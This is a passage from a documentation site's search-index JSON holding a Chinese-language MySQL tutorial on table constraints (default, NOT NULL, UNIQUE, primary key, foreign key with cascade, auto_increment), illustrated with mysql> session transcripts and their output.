t22;","title":"11\uff09\u5220\u9664\u8868"},{"location":"database/mysql/constraint/","text":"\u0011\u7ea6\u675f \u200b \u7ea6\u675f\u4e5f\u53eb\u5b8c\u6574\u6027\u7ea6\u675f\uff08integrity constraint \uff09 \u4ec0\u4e48\u53eb\u5b8c\u6574\u6027\uff1f \u200b \u5b8c\u6574\u6027\u7ea6\u675f\u5c31\u662f\u786e\u4fdd\u6570\u636e\u5e93\u4e2d\u7684\u6570\u636e\u662f\u6709\u610f\u4e49\u7684\u3001\u6b63\u786e\u7684 \u4ec0\u4e48\u662f\u7ea6\u675f\uff1f \u200b \u4e3a\u4e86\u4fdd\u8bc1\u6570\u636e\u7684\u6b63\u786e\u6027\uff0c\u5bf9\u5173\u7cfb\u6a21\u578b\u63d0\u51fa\u7684\u67d0\u4e9b\u7ea6\u675f\u6761\u4ef6\u6216\u8005\u662f\u89c4\u5219\u3002 \u200b \u7ea6\u675f\u4e00\u822c\u4f5c\u7528\u4e8e\u5b57\u6bb5\u4e0a \u7ea6\u675f\u6709\u54ea\u4e9b\uff1f \u200b \u975e\u7a7a\u3001\u552f\u4e00\u3001\u9ed8\u8ba4\u503c\u3001\u4e3b\u952e\u3001\u5916\u952e\u3001\u81ea\u589e \u8bed\u6cd5\uff1a \u5b57\u6bb5\u540d \u5b57\u6bb5\u7c7b\u578b [not null | unique | default \u9ed8\u8ba4\u503c | auto_increment] 1\u3001\u9ed8\u8ba4\u503c mysql> use up; Database changed mysql> create table tdef (name char(10),city char(10) default 'shenyang'); mysql> desc tdef; +-------+----------+------+-----+----------+-------+ | Field | Type | Null | Key | Default | Extra | +-------+----------+------+-----+----------+-------+ | name | char(10) | YES | | NULL | | | city | char(10) | YES | | shenyang | | +-------+----------+------+-----+----------+-------+ mysql> insert into tdef values(); mysql> select * from tdef; +------+----------+ | name | city | +------+----------+ | NULL | shenyang | +------+----------+ 1 row in set (0.00 sec) \u9ed8\u8ba4\u503c\uff1a\u5f53\u7528\u6237\u5411\u8868\u4e2d\u63d2\u5165\u6570\u636e\u65f6\uff0c\u82e5\u6307\u5b9a\u8be5\u5b57\u6bb5\u7684\u503c\uff0c\u90a3\u4e48\u5c31\u63d2\u5165\u6307\u5b9a\u503c\uff1b\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u8be5\u5b57\u6bb5\u7684\u503c\uff0c\u90a3\u4e48\u5c31\u63d2\u5165\u9ed8\u8ba4\u503c\u3002 mysql> insert into tdef values('huangtao','qiqihaer'); mysql> select * from tdef; +----------+----------+ | name | city | +----------+----------+ | NULL | shenyang | | huangtao | qiqihaer | +----------+----------+ \u5bf9\u4e8e\u5df2\u7ecf\u5b58\u5728\u7684\u8868\uff0c\u5982\u4f55\u8bbe\u7f6e\u5b57\u6bb5\u7684\u9ed8\u8ba4\u503c mysql> alter table tdef modify name char(10) default 'mary'; 2\u3001\u975e\u7a7a not null mysql> create table tnn (id int not null,name char(10)); mysql> insert into tnn values(); //\u4f1a\u5c06\u4e0d\u5141\u8bb8\u4e3a\u7a7a\u7684id\u5b57\u6bb5\u503c\u8f6c\u6362\u62100 mysql> show warnings; +---------+------+-----------------------------------------+ | Level | Code | Message | +---------+------+-----------------------------------------+ | Warning | 1364 | Field 'id' doesn't have a default value | +---------+------+-----------------------------------------+ mysql> select * from tnn; +----+------+ | id | name | +----+------+ | 0 | NULL | +----+------+ 1 row in set (0.00 sec) mysql> desc tnn; +-------+----------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-------+----------+------+-----+---------+-------+ | id | int(11) | NO | | NULL | | | name | char(10) | YES | | NULL | | +-------+----------+------+-----+---------+-------+ mysql> alter table tnn modify name char(10) not null; mysql> select * from tnn; +----+------+ | id | name | +----+------+ | 0 | | +----+------+ 1 row in set (0.00 sec) mysql> select * from tnn where name is null; Empty set (0.00 sec) mysql> select * from tnn where name=''; //\u5339\u914d\u7a7a\u5b57\u7b26\u4e32 +----+------+ | id | name | +----+------+ | 0 | | +----+------+ 1 row in set (0.00 sec) #\u6ce8\u610f\uff1a\u975e\u7a7a\u7684\u7ea6\u675f\uff0c\u5bf9\u4e8e\u6570\u503c\u578b\uff0c\u672a\u6307\u5b9a\u63d2\u5165\u503c\u65f6\uff0c\u9ed8\u8ba4\u4f1a\u63d2\u51650\uff1b\u5bf9\u4e8e\u5b57\u7b26\u4e32\u578b\uff0c\u672a\u6307\u5b9a\u63d2\u5165\u503c\u65f6\uff0c\u9ed8\u8ba4\u4f1a\u63d2\u5165\u7a7a\u5b57\u7b26\u4e32\u3002 3\u3001\u552f\u4e00 unique mysql> create table tuni (id int unique,name char(10)); mysql> desc tuni; +-------+----------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-------+----------+------+-----+---------+-------+ | id | int(11) | YES | UNI | NULL | | | name | char(10) | YES | | NULL | | +-------+----------+------+-----+---------+-------+ mysql> insert into tuni values(); mysql> insert into tuni values(); //\u6ce8\u610f\uff1a\u552f\u4e00\u6027\u7ea6\u675f\u5bf9\u7a7a\u503c\u65e0\u6548 mysql> insert into tuni values(1,'tom'); mysql> insert into tuni values(2,'mary'); mysql> insert into tuni values(1,'jack'); ERROR 1062 (23000): Duplicate entry '1' for key 'id' \u5bf9\u4e8e\u552f\u4e00\u6027\u7ea6\u675f\uff0c\u8981\u4e48\u5411\u8be5\u5b57\u6bb5\u63d2\u5165\u7a7a\u503c\uff0c\u8981\u4e48\u5c31\u5411\u8be5\u5b57\u6bb5\u63d2\u5165\u552f\u4e00\u7684\u503c\u3002 4\u3001\u4e3b\u952e primary key \u4e3b\u952e\u662f\u8868\u4e2d\u7684\u7279\u6b8a\u5b57\u6bb5\uff0c\u8fd9\u4e2a\u5b57\u6bb5\u80fd\u591f\u552f\u4e00\u6807\u8bc6\u8868\u4e2d\u7684\u6bcf\u4e00\u6761\u8bb0\u5f55\u3002 \u4e3b\u952e\u7528\u9014\uff1a\u5feb\u901f\u5b9a\u4f4d\u6570\u636e \u4e3b\u952e\u5728\u4e00\u5f20\u8868\u4e2d\u6700\u591a\u53ea\u80fd\u6709\u4e00\u4e2a\u3002 \u4e3b\u952e\u6ee1\u8db3\u7684\u6761\u4ef6\uff1a\u975e\u7a7a\u4e14\u552f\u4e00 primary key = not null + unique 1\uff09\u4f7f\u7528\u5355\u4e2a\u5b57\u6bb5\u505a\u4e3b\u952e a\u3001\u5728\u5b57\u6bb5\u540e\u76f4\u63a5\u6307\u5b9a\u4e3b\u952e\u7ea6\u675f mysql> create table pri (id int primary key,age int,name char(10)); mysql> desc pri; +-------+----------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-------+----------+------+-----+---------+-------+ | id | int(11) | NO | PRI | NULL | | | age | int(11) | YES | | NULL | | | name | char(10) | YES | | NULL | | +-------+----------+------+-----+---------+-------+ 3 rows in set (0.00 sec) mysql> insert into pri(id) values (1); Query OK, 1 row affected (0.01 sec) mysql> insert into pri(id) values (1); ERROR 1062 (23000): Duplicate entry '1' for key 'PRIMARY' mysql> insert into pri values(); Query OK, 1 row affected, 1 warning (0.01 sec) mysql> show warnings; +---------+------+-----------------------------------------+ | Level | Code | Message | +---------+------+-----------------------------------------+ | Warning | 1364 | Field 'id' doesn't have a default value | +---------+------+-----------------------------------------+ 1 row in set (0.00 sec) mysql> select * from pri; +----+------+------+ | id | age | name | +----+------+------+ | 0 | NULL | NULL | | 1 | NULL | NULL | +----+------+------+ 2 rows in set (0.00 sec) mysql> insert into pri values(); ERROR 1062 (23000): Duplicate entry '0' for key 'PRIMARY' b\u3001\u6574\u5f20\u8868\u7684\u6240\u6709\u5b57\u6bb5\u90fd\u5b9a\u4e49\u5b8c\u6210\u4e4b\u540e\u518d\u53bb\u6307\u5b9a\u4e3b\u952e mysql> create table pri1 (id int,name char(10),primary key(id)); mysql> desc pri1; +-------+----------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-------+----------+------+-----+---------+-------+ | id | int(11) | NO | PRI | 0 | | | name | char(10) | YES | | NULL | | +-------+----------+------+-----+---------+-------+ 2 rows in set (0.00 sec) 2\uff09\u591a\u4e2a\u5b57\u6bb5\u8054\u5408\u505a\u4e3b\u952e mysql> desc mysql.user; //user\u548chost\u4e24\u4e2a\u5b57\u6bb5\u8054\u5408\u505a\u4e3b\u952e +------------------------+-----------------------------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +------------------------+-----------------------------------+------+-----+---------+-------+ | Host | char(60) | NO | PRI | | | | User | char(16) | NO | PRI | | | | Password | char(41) | NO | | | | mysql> select user,host from mysql.user; +----------+-------------+ | user | host | +----------+-------------+ | douni | % | | douni2 | % | | douwo | % | | part | % | | root | 127.0.0.1 | | allpriv | 172.16.%.% | | allpriv1 | 172.16.%.% | | remote | 172.16.42.8 | | root | ::1 | | | localhost | | ni | localhost | | root | localhost | | | mysql | | root | mysql | +----------+-------------+ 14 rows in set (0.05 sec) \u6ce8\u610f\uff1a\u8054\u5408\u4e3b\u952e\u53ea\u80fd\u5728\u6240\u6709\u5b57\u6bb5\u90fd\u5b9a\u4e49\u4e4b\u540e\uff0c\u518d\u53bb\u5b9a\u4e49\u4e3b\u952e mysql> create table pri2 (id int,name char(10),age int,primary key (id,name)); mysql> insert into pri2 values(1,'Tom',22); Query OK, 1 row affected (0.00 sec) mysql> insert into pri2 values(1,'Tom',22); ERROR 1062 (23000): Duplicate entry '1-Tom' for key 'PRIMARY' mysql> insert into pri2 values(1,'Mary',20); Query OK, 1 row affected (0.20 sec) mysql> insert into pri2 values(2,'Tom',20); Query OK, 1 row affected (0.00 sec) \u5bf9\u4e00\u4e2a\u5df2\u7ecf\u5b58\u5728\u7684\u8868\uff0c\u5982\u4f55\u6dfb\u52a0\u4e3b\u952e\uff1f\u5982\u4f55\u5220\u9664\u4e3b\u952e\uff1f \u6dfb\u52a0\u4e3b\u952e\uff1a alter table score add primary key(sno); \u5220\u9664\u4e3b\u952e\uff1a alter table score drop primary key; 5\u3001\u5916\u952e foreign key \u5916\u952e\uff1a\u4e00\u4e2a\u8868B\u4e2d\u7684\u6570\u636e\u4f9d\u8d56\u4e8e\u53e6\u4e00\u5f20\u8868A\u7684\u4e3b\u952e\u5217\u7684\u6570\u636e\uff0c\u5982\u679cA\u8868\u4e2d\u672a\u51fa\u73b0\u7684\u503c\uff0c\u662f\u4e0d\u80fd\u591f\u51fa\u73b0\u5728B\u8868\u4e2d\u7684 A\uff1a\u7236\u8868 B\uff1a\u5b50\u8868\uff0c\u5916\u952e\u5728\u5b50\u8868\u4e2d \u4e3b\u952e\u548c\u5916\u952e\u5c31\u50cf\u662f\u8868\u4e4b\u95f4\u7684\u7c98\u5408\u5242\uff0c\u80fd\u591f\u5c06\u591a\u4e2a\u8868\u5173\u8054\u8d77\u6765\u3002 \u521b\u5efa\u5916\u952e\u7684\u6761\u4ef6\uff1a 1\uff09\u5b58\u50a8\u5f15\u64ce\u662finnodb\uff08\u662fmysql5.5\u9ed8\u8ba4\u7684\u5f15\u64ce\uff09 2\uff09\u76f8\u5173\u8054\u5b57\u6bb5\u6570\u636e\u7c7b\u578b\u8981\u4e00\u81f4 3\uff09\u6700\u597d\u5728\u5916\u952e\u5217\u4e0a\u5efa\u7d22\u5f15 \u4f8b\u5b50\uff1a dept\uff1a\u90e8\u95e8\u8868 emp\uff1a\u5458\u5de5\u8868 mysql> create table dept (dno int,dname char(10),primary key (dno)); mysql> create table emp (eno int,edno int,ename char(10),index(edno),foreign key (edno) references dept(dno)); \u5411\u7236\u8868\u4e2d\u63d2\u5165\u6570\u636e mysql> insert into dept values(100,'manager'),(101,'dba'),(102,'hr'),(103,'sa'); \u5411\u5b50\u8868\u4e2d\u63d2\u5165\u6570\u636e mysql> insert into emp values(1,100,'Tom'); mysql> insert into emp values(2,101,'Mary'); mysql> insert into emp values(3,108,'Daji'); //\u53cd\u4f8b\uff1a\u63d2\u5165\u7236\u8868\u4e2d\u4e0d\u5b58\u5728\u7684\u90e8\u95e8\u53f7 ERROR 1452 (23000): Cannot add or update a child row: a foreign key constraint fails (`up`.`emp`, CONSTRAINT `emp_ibfk_1` FOREIGN KEY (`edno`) REFERENCES `dept` (`dno`)) \u5220\u9664\u7236\u8868\u4e2d\u7684\u6570\u636e mysql> select * from dept; +-----+---------+ | dno | dname | +-----+---------+ | 100 | manager | | 101 | dba | | 102 | hr | | 103 | sa | +-----+---------+ mysql> select * from emp; +------+------+-------+ | eno | edno | ename | +------+------+-------+ | 1 | 100 | Tom | | 2 | 101 | Mary | +------+------+-------+ 2 rows in set (0.00 sec) mysql> delete from dept where dno=102; mysql> delete from dept where dno=101; ERROR 1451 (23000): Cannot delete or update a parent row: a foreign key constraint fails (`up`.`emp`, CONSTRAINT `emp_ibfk_1` FOREIGN KEY (`edno`) REFERENCES `dept` (`dno`)) \u4ee5\u4e0a\u5c0f\u5b9e\u9a8c\u5c0f\u7ed3\uff1a 1\uff09\u5b50\u8868\u4e2d\u7684\u6570\u636e\u4f9d\u8d56\u4e8e\u7236\u8868\uff0c\u4e0d\u80fd\u5411\u5b50\u8868\u4e2d\u63d2\u5165\u7236\u8868\u4e2d\u4e0d\u5b58\u5728\u7684\u503c 2\uff09\u4e0d\u80fd\u5220\u9664\u7236\u8868\u4e2d\u88ab\u5b50\u8868\u6240\u4f9d\u8d56\u7684\u884c \u5982\u4f55\u89e3\u51b3\uff1f on delete cascade \u7ea7\u8054\u5220\u9664 on update cascade \u7ea7\u8054\u66f4\u65b0 mysql> drop table emp; \u5b8c\u6574\u7684\u5916\u952e\u521b\u5efa mysql> create table emp (eno int,edno int,ename char(10),index(edno),foreign key (edno) references dept(dno) on delete cascade on update cascade); mysql> insert into emp values(1,100,'Tom'); mysql> insert into emp values(2,101,'Songjiang'); mysql> insert into emp values(5,101,'Likui'); mysql> delete from dept where dno=101; mysql> select * from dept; +-----+---------+ | dno | dname | +-----+---------+ | 100 | manager | | 103 | sa | +-----+---------+ 2 rows in set (0.00 sec) mysql> select * from emp; +------+------+-------+ | eno | edno | ename | +------+------+-------+ | 1 | 100 | Tom | +------+------+-------+ 1 row in set (0.00 sec) mysql> update dept set dno=110 where dno=100; mysql> select * from emp; +------+------+-------+ | eno | edno | ename | +------+------+-------+ | 1 | 110 | Tom | +------+------+-------+ 1 row in set (0.00 sec) \u6709\u4e86\u7ea7\u8054\u5220\u9664\u548c\u7ea7\u8054\u4fee\u6539\u9009\u9879\uff0c\u7236\u8868\u4e2d\u7684\u6570\u636e\u53d1\u751f\u5220\u9664\u6216\u8005\u66f4\u65b0\u65f6\uff0c\u5b50\u8868\u4e2d\u7684\u6570\u636e\u4e5f\u4f1a\u53d1\u751f\u76f8\u5e94\u7684\u53d8\u5316\u3002 \u5220\u9664\u5916\u952e \u67e5\u770b\u5916\u952e\u7684\u540d\u5b57 mysql> show create table emp\\G *************************** 1. row *************************** Table: emp Create Table: CREATE TABLE `emp` ( `eno` int(11) DEFAULT NULL, `edno` int(11) DEFAULT NULL, `ename` char(10) DEFAULT NULL, KEY `edno` (`edno`), //\u7d22\u5f15 CONSTRAINT `emp_ibfk_1` FOREIGN KEY (`edno`) REFERENCES `dept` (`dno`) ON DELETE CASCADE ON UPDATE CASCADE ) ENGINE=InnoDB DEFAULT CHARSET=utf8 1 row in set (0.00 sec) mysql> alter table emp drop foreign key emp_ibfk_1; 6\u3001\u81ea\u589e auto_increment \u8981\u6c42\uff1a 1\uff09\u8be5\u5b57\u6bb5\u7684\u7c7b\u578b\u5fc5\u987b\u662f\u6570\u503c\u578b\u7684 2\uff09\u5b57\u6bb5\u4e0a\u8981\u6709\u552f\u4e00\u6027\u7d22\u5f15\u6216\u4e3b\u952e mysql> create table zz (id int primary key auto_increment); mysql> desc zz; +-------+---------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +-------+---------+------+-----+---------+----------------+ | id | int(11) | NO | PRI | NULL | auto_increment | +-------+---------+------+-----+---------+----------------+ 1 row in set (0.00 sec) mysql> insert into zz values(); Query OK, 1 row affected (0.02 sec) mysql> select * from zz; +----+ | id | +----+ | 1 | +----+ 1 row in set (0.00 sec) \u51e0\u70b9\u8bf4\u660e\uff1a 1\uff09\u5f53\u81ea\u589e\u5b57\u6bb5\u53d1\u751f\u65ad\u6863\u65f6\uff0c\u503c\u4ece\u6700\u5927\u503c\u7ee7\u7eed\u81ea\u589e mysql> insert into zz values(); Query OK, 1 row affected (0.01 sec) mysql> select * from zz; +----+ | id | +----+ | 1 | | 2 | | 5 | | 6 | +----+ 4 rows in set (0.00 sec) 2\uff09\u5f53\u7528delete\u5220\u9664\u6700\u5927\u503c\u65f6\uff0c\u4e0b\u4e00\u4e2a\u503c\u4ecd\u7136\u4ece\u6700\u5927\u503c\u7684\u4e0b\u4e00\u4e2a\u7ee7\u7eed\u81ea\u589e mysql> delete from zz where id=6; Query OK, 1 row affected (0.04 sec) mysql> insert into zz values(); Query OK, 1 row affected (0.00 sec) mysql> select * from zz; +----+ | id | +----+ | 1 | | 2 | | 5 | | 7 | +----+ 4 rows in set (0.00 sec) 3\uff09\u5f53\u4f60truncate\u4e00\u4e2a\u8868\u65f6\uff0c\u503c\u4ece1\u5f00\u59cb\u91cd\u65b0\u8ba1\u7b97 mysql> truncate table zz; Query OK, 0 rows affected (0.05 sec) mysql> insert into zz values(); Query OK, 1 row affected (0.00 sec) mysql> select * from zz; +----+ | id | +----+ | 1 | +----+ 1 row in set (0.00 sec) \u200b","title":"\u7ea6\u675f"},{"location":"database/mysql/constraint/#_1","text":"\u200b \u7ea6\u675f\u4e5f\u53eb\u5b8c\u6574\u6027\u7ea6\u675f\uff08integrity constraint \uff09 \u4ec0\u4e48\u53eb\u5b8c\u6574\u6027\uff1f \u200b \u5b8c\u6574\u6027\u7ea6\u675f\u5c31\u662f\u786e\u4fdd\u6570\u636e\u5e93\u4e2d\u7684\u6570\u636e\u662f\u6709\u610f\u4e49\u7684\u3001\u6b63\u786e\u7684 \u4ec0\u4e48\u662f\u7ea6\u675f\uff1f \u200b \u4e3a\u4e86\u4fdd\u8bc1\u6570\u636e\u7684\u6b63\u786e\u6027\uff0c\u5bf9\u5173\u7cfb\u6a21\u578b\u63d0\u51fa\u7684\u67d0\u4e9b\u7ea6\u675f\u6761\u4ef6\u6216\u8005\u662f\u89c4\u5219\u3002 \u200b \u7ea6\u675f\u4e00\u822c\u4f5c\u7528\u4e8e\u5b57\u6bb5\u4e0a \u7ea6\u675f\u6709\u54ea\u4e9b\uff1f \u200b \u975e\u7a7a\u3001\u552f\u4e00\u3001\u9ed8\u8ba4\u503c\u3001\u4e3b\u952e\u3001\u5916\u952e\u3001\u81ea\u589e \u8bed\u6cd5\uff1a \u5b57\u6bb5\u540d \u5b57\u6bb5\u7c7b\u578b [not null | unique | default \u9ed8\u8ba4\u503c | auto_increment]","title":"\u0011\u7ea6\u675f"},{"location":"database/mysql/constraint/#1","text":"mysql> use up; Database changed mysql> create table tdef (name char(10),city char(10) default 'shenyang'); mysql> desc tdef; +-------+----------+------+-----+----------+-------+ | Field | Type | Null | Key | Default | Extra | +-------+----------+------+-----+----------+-------+ | name | char(10) | YES | | NULL | | | city | char(10) | YES | | shenyang | | +-------+----------+------+-----+----------+-------+ mysql> insert into tdef values(); mysql> select * from tdef; +------+----------+ | name | city | +------+----------+ | NULL | shenyang | +------+----------+ 1 row in set (0.00 sec) \u9ed8\u8ba4\u503c\uff1a\u5f53\u7528\u6237\u5411\u8868\u4e2d\u63d2\u5165\u6570\u636e\u65f6\uff0c\u82e5\u6307\u5b9a\u8be5\u5b57\u6bb5\u7684\u503c\uff0c\u90a3\u4e48\u5c31\u63d2\u5165\u6307\u5b9a\u503c\uff1b\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u8be5\u5b57\u6bb5\u7684\u503c\uff0c\u90a3\u4e48\u5c31\u63d2\u5165\u9ed8\u8ba4\u503c\u3002 mysql> insert into tdef values('huangtao','qiqihaer'); mysql> select * from tdef; +----------+----------+ | name | city | +----------+----------+ | NULL | shenyang | | huangtao | qiqihaer | +----------+----------+ \u5bf9\u4e8e\u5df2\u7ecf\u5b58\u5728\u7684\u8868\uff0c\u5982\u4f55\u8bbe\u7f6e\u5b57\u6bb5\u7684\u9ed8\u8ba4\u503c mysql> alter table tdef modify name char(10) default 'mary';","title":"1\u3001\u9ed8\u8ba4\u503c"},{"location":"database/mysql/constraint/#2-not-null","text":"mysql> create table tnn (id int not null,name char(10)); mysql> insert into tnn values(); //\u4f1a\u5c06\u4e0d\u5141\u8bb8\u4e3a\u7a7a\u7684id\u5b57\u6bb5\u503c\u8f6c\u6362\u62100 mysql> show warnings; +---------+------+-----------------------------------------+ | Level | Code | Message | +---------+------+-----------------------------------------+ | Warning | 1364 | Field 'id' doesn't have a default value | +---------+------+-----------------------------------------+ mysql> select * from tnn; +----+------+ | id | name | +----+------+ | 0 | NULL | +----+------+ 1 row in set (0.00 sec) mysql> desc tnn; +-------+----------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-------+----------+------+-----+---------+-------+ | id | int(11) | NO | | NULL | | | name | char(10) | YES | | NULL | | +-------+----------+------+-----+---------+-------+ mysql> alter table tnn modify name char(10) not null; mysql> select * from tnn; +----+------+ | id | name | +----+------+ | 0 | | +----+------+ 1 row in set (0.00 sec) mysql> select * from tnn where name is null; Empty set (0.00 sec) mysql> select * from tnn where name=''; //\u5339\u914d\u7a7a\u5b57\u7b26\u4e32 +----+------+ | id | name | +----+------+ | 0 | | +----+------+ 1 row in set (0.00 sec) #\u6ce8\u610f\uff1a\u975e\u7a7a\u7684\u7ea6\u675f\uff0c\u5bf9\u4e8e\u6570\u503c\u578b\uff0c\u672a\u6307\u5b9a\u63d2\u5165\u503c\u65f6\uff0c\u9ed8\u8ba4\u4f1a\u63d2\u51650\uff1b\u5bf9\u4e8e\u5b57\u7b26\u4e32\u578b\uff0c\u672a\u6307\u5b9a\u63d2\u5165\u503c\u65f6\uff0c\u9ed8\u8ba4\u4f1a\u63d2\u5165\u7a7a\u5b57\u7b26\u4e32\u3002","title":"2\u3001\u975e\u7a7a   not null"},{"location":"database/mysql/constraint/#3-unique","text":"mysql> create table tuni (id int unique,name char(10)); mysql> desc tuni; +-------+----------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-------+----------+------+-----+---------+-------+ | id | int(11) | YES | UNI | NULL | | | name | char(10) | YES | | NULL | | +-------+----------+------+-----+---------+-------+ mysql> insert into tuni values(); mysql> insert into tuni values(); //\u6ce8\u610f\uff1a\u552f\u4e00\u6027\u7ea6\u675f\u5bf9\u7a7a\u503c\u65e0\u6548 mysql> insert into tuni values(1,'tom'); mysql> insert into tuni values(2,'mary'); mysql> insert into tuni values(1,'jack'); ERROR 1062 (23000): Duplicate entry '1' for key 'id' \u5bf9\u4e8e\u552f\u4e00\u6027\u7ea6\u675f\uff0c\u8981\u4e48\u5411\u8be5\u5b57\u6bb5\u63d2\u5165\u7a7a\u503c\uff0c\u8981\u4e48\u5c31\u5411\u8be5\u5b57\u6bb5\u63d2\u5165\u552f\u4e00\u7684\u503c\u3002","title":"3\u3001\u552f\u4e00   unique"},{"location":"database/mysql/constraint/#4-primary-key","text":"\u4e3b\u952e\u662f\u8868\u4e2d\u7684\u7279\u6b8a\u5b57\u6bb5\uff0c\u8fd9\u4e2a\u5b57\u6bb5\u80fd\u591f\u552f\u4e00\u6807\u8bc6\u8868\u4e2d\u7684\u6bcf\u4e00\u6761\u8bb0\u5f55\u3002 \u4e3b\u952e\u7528\u9014\uff1a\u5feb\u901f\u5b9a\u4f4d\u6570\u636e \u4e3b\u952e\u5728\u4e00\u5f20\u8868\u4e2d\u6700\u591a\u53ea\u80fd\u6709\u4e00\u4e2a\u3002 \u4e3b\u952e\u6ee1\u8db3\u7684\u6761\u4ef6\uff1a\u975e\u7a7a\u4e14\u552f\u4e00 primary key = not null + unique","title":"4\u3001\u4e3b\u952e    primary key"},{"location":"database/mysql/constraint/#1_1","text":"","title":"1\uff09\u4f7f\u7528\u5355\u4e2a\u5b57\u6bb5\u505a\u4e3b\u952e"},{"location":"database/mysql/constraint/#a","text":"mysql> create table pri (id int primary key,age int,name char(10)); mysql> desc pri; +-------+----------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-------+----------+------+-----+---------+-------+ | id | int(11) | NO | PRI | NULL | | | age | int(11) | YES | | NULL | | | name | char(10) | YES | | NULL | | +-------+----------+------+-----+---------+-------+ 3 rows in set (0.00 sec) mysql> insert into pri(id) values (1); Query OK, 1 row affected (0.01 sec) mysql> insert into pri(id) values (1); ERROR 1062 (23000): Duplicate entry '1' for key 'PRIMARY' mysql> insert into pri values(); Query OK, 1 row affected, 1 warning (0.01 sec) mysql> show warnings; +---------+------+-----------------------------------------+ | Level | Code | Message | +---------+------+-----------------------------------------+ | Warning | 1364 | Field 'id' doesn't have a default value | +---------+------+-----------------------------------------+ 1 row in set (0.00 sec) mysql> select * from pri; +----+------+------+ | id | age | name | +----+------+------+ | 0 | NULL | NULL | | 1 | NULL | NULL | +----+------+------+ 2 rows in set (0.00 sec) mysql> insert into pri values(); ERROR 1062 (23000): Duplicate entry '0' for key 'PRIMARY'","title":"a\u3001\u5728\u5b57\u6bb5\u540e\u76f4\u63a5\u6307\u5b9a\u4e3b\u952e\u7ea6\u675f"},{"location":"database/mysql/constraint/#b","text":"mysql> create table pri1 (id int,name char(10),primary key(id)); mysql> desc pri1; +-------+----------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-------+----------+------+-----+---------+-------+ | id | int(11) | NO | PRI | 0 | | | name | char(10) | YES | | NULL | | +-------+----------+------+-----+---------+-------+ 2 rows in set (0.00 sec)","title":"b\u3001\u6574\u5f20\u8868\u7684\u6240\u6709\u5b57\u6bb5\u90fd\u5b9a\u4e49\u5b8c\u6210\u4e4b\u540e\u518d\u53bb\u6307\u5b9a\u4e3b\u952e"},{"location":"database/mysql/constraint/#2","text":"mysql> desc mysql.user; //user\u548chost\u4e24\u4e2a\u5b57\u6bb5\u8054\u5408\u505a\u4e3b\u952e +------------------------+-----------------------------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +------------------------+-----------------------------------+------+-----+---------+-------+ | Host | char(60) | NO | PRI | | | | User | char(16) | NO | PRI | | | | Password | char(41) | NO | | | | mysql> select user,host from mysql.user; +----------+-------------+ | user | host | +----------+-------------+ | douni | % | | douni2 | % | | douwo | % | | part | % | | root | 127.0.0.1 | | allpriv | 172.16.%.% | | allpriv1 | 172.16.%.% | | remote | 172.16.42.8 | | root | ::1 | | | localhost | | ni | localhost | | root | localhost | | | mysql | | root | mysql | +----------+-------------+ 14 rows in set (0.05 sec) \u6ce8\u610f\uff1a\u8054\u5408\u4e3b\u952e\u53ea\u80fd\u5728\u6240\u6709\u5b57\u6bb5\u90fd\u5b9a\u4e49\u4e4b\u540e\uff0c\u518d\u53bb\u5b9a\u4e49\u4e3b\u952e mysql> create table pri2 (id int,name char(10),age int,primary key (id,name)); mysql> insert into pri2 values(1,'Tom',22); Query OK, 1 row affected (0.00 sec) mysql> insert into pri2 values(1,'Tom',22); ERROR 1062 (23000): Duplicate entry '1-Tom' for key 'PRIMARY' mysql> insert into pri2 values(1,'Mary',20); Query OK, 1 row affected (0.20 sec) mysql> insert into pri2 values(2,'Tom',20); Query OK, 1 row affected (0.00 sec) \u5bf9\u4e00\u4e2a\u5df2\u7ecf\u5b58\u5728\u7684\u8868\uff0c\u5982\u4f55\u6dfb\u52a0\u4e3b\u952e\uff1f\u5982\u4f55\u5220\u9664\u4e3b\u952e\uff1f \u6dfb\u52a0\u4e3b\u952e\uff1a alter table score add primary key(sno); \u5220\u9664\u4e3b\u952e\uff1a alter table score drop primary key;","title":"2\uff09\u591a\u4e2a\u5b57\u6bb5\u8054\u5408\u505a\u4e3b\u952e"},{"location":"database/mysql/constraint/#5-foreign-key","text":"\u5916\u952e\uff1a\u4e00\u4e2a\u8868B\u4e2d\u7684\u6570\u636e\u4f9d\u8d56\u4e8e\u53e6\u4e00\u5f20\u8868A\u7684\u4e3b\u952e\u5217\u7684\u6570\u636e\uff0c\u5982\u679cA\u8868\u4e2d\u672a\u51fa\u73b0\u7684\u503c\uff0c\u662f\u4e0d\u80fd\u591f\u51fa\u73b0\u5728B\u8868\u4e2d\u7684 A\uff1a\u7236\u8868 B\uff1a\u5b50\u8868\uff0c\u5916\u952e\u5728\u5b50\u8868\u4e2d \u4e3b\u952e\u548c\u5916\u952e\u5c31\u50cf\u662f\u8868\u4e4b\u95f4\u7684\u7c98\u5408\u5242\uff0c\u80fd\u591f\u5c06\u591a\u4e2a\u8868\u5173\u8054\u8d77\u6765\u3002 \u521b\u5efa\u5916\u952e\u7684\u6761\u4ef6\uff1a 1\uff09\u5b58\u50a8\u5f15\u64ce\u662finnodb\uff08\u662fmysql5.5\u9ed8\u8ba4\u7684\u5f15\u64ce\uff09 2\uff09\u76f8\u5173\u8054\u5b57\u6bb5\u6570\u636e\u7c7b\u578b\u8981\u4e00\u81f4 3\uff09\u6700\u597d\u5728\u5916\u952e\u5217\u4e0a\u5efa\u7d22\u5f15 \u4f8b\u5b50\uff1a dept\uff1a\u90e8\u95e8\u8868 emp\uff1a\u5458\u5de5\u8868 mysql> create table dept (dno int,dname char(10),primary key (dno)); mysql> create table emp (eno int,edno int,ename char(10),index(edno),foreign key (edno) references dept(dno)); \u5411\u7236\u8868\u4e2d\u63d2\u5165\u6570\u636e mysql> insert into dept values(100,'manager'),(101,'dba'),(102,'hr'),(103,'sa'); \u5411\u5b50\u8868\u4e2d\u63d2\u5165\u6570\u636e mysql> insert into emp values(1,100,'Tom'); mysql> insert into emp 